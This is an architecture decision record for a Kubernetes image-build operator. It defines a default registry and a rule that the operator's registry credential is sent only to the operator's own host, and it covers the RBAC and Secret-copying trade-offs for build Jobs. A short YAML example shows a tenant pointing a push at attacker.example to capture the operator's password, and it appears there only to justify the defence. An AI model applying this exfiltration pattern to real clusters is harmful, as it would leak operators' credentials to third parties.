# 34. A default registry, and whose credential is used

Date: 2026-08-20

## Status

Accepted. Amends [0030](0030-a-real-registry-serves-both-kinds.md) and
[0031](0031-the-retention-guarantee.md), and depends on
[0033](0033-one-chart-one-namespace.md) for the single namespace that makes the credential shareable.

## Context

[0030](0030-a-real-registry-serves-both-kinds.md) made a registry the serving surface and
[0033](0033-one-chart-one-namespace.md) bundled one, enabled by default. That left a gap that made
the bundle pointless: nothing used it.

`spec.push.repository` was required and fully qualified, so every object had to name a host. A
registry installed by the chart, addressed by a Service DNS name the chart generates, would have to
be pasted into every `ImageComposition` and `ImageBuild` in the cluster — and re-pasted if the
release were renamed. A bundled registry nobody publishes to is a bundled registry that only costs
storage.

## Decision

**`push.repository` becomes optional. Omitted, an object publishes to the operator's default
registry**, configured once with `--default-registry`:

```
<default-registry>/<namespace>/<name>
```

On `ImageBuild`, `push` itself becomes optional too — a build with no `push` block at all publishes
to the default. It still always publishes to a *registry*: the Job runs in another pod and cannot
reach a loopback endpoint (0025). Only *which* registry moved out of the spec.

**Namespace-qualified, and not for tidiness.** One registry is now shared by the whole cluster, so a
bare object name collides the moment two namespaces both contain an `app`. The collision would be
silent — resolved by whichever object reconciled last, under a tag-conflict policy
([0029](0029-three-valued-tag-conflict-policy.md)) that would read it as a legitimate conflict rather
than as two unrelated objects landing on one name.

### The credential rule, which is the substance of this record

The default credential is a `dockerconfigjson` Secret read from **the controller's own namespace**,
not the object's. It belongs to the operator who installed the chart.

> **The operator's credential is sent to the operator's registry, and nowhere else.**

Keyed on the registry **host**. An object may name its own path inside that registry and still be
authenticated — that is the ordinary case. An object naming a *different host* gets its own
`secretRef` or nothing.

Without the rule the feature is a credential-exfiltration primitive. Anyone able to create an
`ImageComposition` — a namespaced, ordinary permission — writes:

```yaml
spec:
  push:
    repository: attacker.example/x
```

and the controller connects to a host the tenant chose and presents the operator's registry
password. Nothing about the request looks wrong: it is a well-formed push to a well-formed
reference, and it succeeds.

**The first version of this rule keyed on the wrong thing**, and it is worth recording because the
mistake was the safer-sounding option. It asked "did the object name a repository at all?" and
withheld the credential whenever it had — which also withheld it from every object wanting a
specific path in *the operator's own registry*. The e2e caught it as a `401` on every build.

Leaving it would have been worse than the bug it prevented. The workaround for a denied push to the
operator's own registry is for the operator to hand their registry password to every tenant that
needs a custom path — trading a narrow, deliberate use of the credential for its wholesale
distribution.

A path prefix inside the host is **not** treated as a boundary. Anyone who can reach the registry can
reach every path in it, so enforcing prefixes here would imply a guarantee the registry does not
make.

### The build Job cannot mount the operator's credential

`ImageComposition` publishes from the controller process, so it reads the operator's Secret directly.
`ImageBuild` does not: BuildKit pushes from inside a Job, and **a pod can only mount Secrets from its
own namespace**.

The Job runs in the object's namespace, and moving it is not an option:

- it mounts that namespace's build secrets (`spec.secrets[].secretRef`)
- it **executes arbitrary code** from the tenant's Dockerfile, which is the entire reason
  [0025](0025-dockerfile-builds-as-a-second-kind.md) made the builder a separate component. Running
  it in the operator's namespace would put that code beside the operator's registry credential and
  both controllers' ServiceAccount tokens
- owner references cannot cross namespaces, so deleting an `ImageBuild` would stop collecting its Job

**So the controller copies the credential, and the copy lives exactly as long as the build.** It is
owned by the `ImageBuild` and named after the Job, so it is garbage-collected with the object and
replaced rather than accumulated when the inputs change.

This does not eliminate the exposure and should not be described as if it did: while a build runs,
anyone who can read Secrets in that namespace can read the operator's registry credential. What makes
it tolerable is that such a namespace **can already push arbitrary content to that registry through
an `ImageBuild`** — the credential lets it do directly what it could already do indirectly. What the
copy buys is time-bounding: a build's duration instead of forever.

**The RBAC cost is real and is not narrowable.** The builder gains `create` and `update` on Secrets,
and `create` cannot be restricted to a name by RBAC — so it can create a Secret in any namespace. It
still cannot `list` or `watch` them, so it can only touch Secrets whose names it already knows.

An operator who finds that trade unacceptable has two exits: give each `ImageBuild` its own
`secretRef`, or turn the bundled registry's authentication off and rely on a NetworkPolicy, which is
the posture the embedded serving endpoint had.

### Reaching the registry

The chart generates the password, writes the htpasswd zot authenticates against and the
dockerconfigjson both controllers push with, and reuses the existing value on upgrade — a rotated
password would lock the controllers out of everything they had published.

zot is configured for **anonymous read, authenticated write**, which is the posture the embedded
serving endpoint had: a kubelet pulls without credentials, so anything else breaks image pulls.

**Workload pulls still need a node-resolvable name, and this record does not change that.** The
controllers reach the registry over cluster DNS; containerd resolves image references with the
*node's* resolver and cannot see cluster DNS. `registry.host` is what appears in
`status.artifact.ref`, and pointing it at the registry is the operator's job — an ingress, or a
NodePort plus a `certs.d` drop-in. The chart warns when it is unset, because the failure otherwise
appears as `ErrImagePull` against a Service that is perfectly healthy.

## Consequences

**A default install publishes somewhere real with no spec edits**, which is the point.

**`--default-registry` is operator configuration, so its absence is Pending, not Stalled.** An object
that names no repository when no default is configured waits. Stalling would need a generation change
to recover from, and the fix is a controller flag — nothing about the object is wrong.

**The security rule is one comparison away from being wrong in either direction**, and it is not
obviously load-bearing when read: too strict and every push to the operator's own registry fails,
too loose and the password goes to whatever host a tenant names. It is covered by a test that fails
with the comparison removed, and named here so that a future reader deleting it as redundant has to
argue with a record first.

**An explicit `secretRef` wins even on the default target.** The object asked for a specific
credential; substituting a more privileged one because it happens to be available is worse than
honouring what was written.

**BYO registries stay first-class.** `registry.enabled=false` with `defaultRegistry.host` and
`defaultRegistry.existingPushSecret` installs no zot and uses the operator's own registry and
credential, with the same rule applying to both.
